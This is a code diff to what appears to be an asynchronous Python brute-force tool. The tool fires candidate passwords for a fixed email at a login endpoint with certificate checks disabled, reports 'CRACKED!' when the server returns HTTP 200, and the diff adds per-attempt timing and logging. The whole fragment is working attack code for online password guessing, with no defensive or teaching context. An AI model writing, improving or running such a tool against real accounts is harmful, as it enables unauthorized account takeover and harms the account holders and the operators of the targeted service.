@@ -42,27 +42,28 @@ async def worker(session, queue):
             queue.task_done()
             break
         try:
+            t0 = time.time()
             async with session.post(
                 URL, json={"email": EMAIL, "password": pw},
                 ssl=False, timeout=aiohttp.ClientTimeout(total=15)
             ) as resp:
                 tried += 1
+                ms = (time.time() - t0) * 1000
+                elapsed = time.time() - start_time
+                rps = tried / elapsed if elapsed > 0 else 0
                 if resp.status == 200:
                     data = await resp.json()
                     found = True
-                    elapsed = time.time() - start_time
                     print(f"\n{'='*50}")
-                    print(f"[+] CRACKED! Password: {pw}")
+                    print(f"[+] CRACKED! >>> {pw} <<< [{ms:.0f}ms] HTTP 200")
                     print(f"[+] Response: {data}")
-                    print(f"[*] {tried:,} attempts in {elapsed:.1f}s")
+                    print(f"[*] {tried:,} attempts in {elapsed:.1f}s ({rps:.0f} req/s)")
                     queue.task_done()
                     return
-                if tried % 10000 == 0:
-                    elapsed = time.time() - start_time
-                    rps = tried / elapsed if elapsed > 0 else 0
-                    print(f"  [{tried:,}] {rps:.0f} req/s", flush=True)
-        except:
-            pass
+                print(f"  [{tried:,}] {rps:.0f}r/s | {ms:5.0f}ms | {resp.status} | {pw}", flush=True)
+        except Exception as e:
+            tried += 1
+            print(f"  [{tried:,}] ERR | {pw} | {e}", flush=True)
         queue.task_done()
 
 
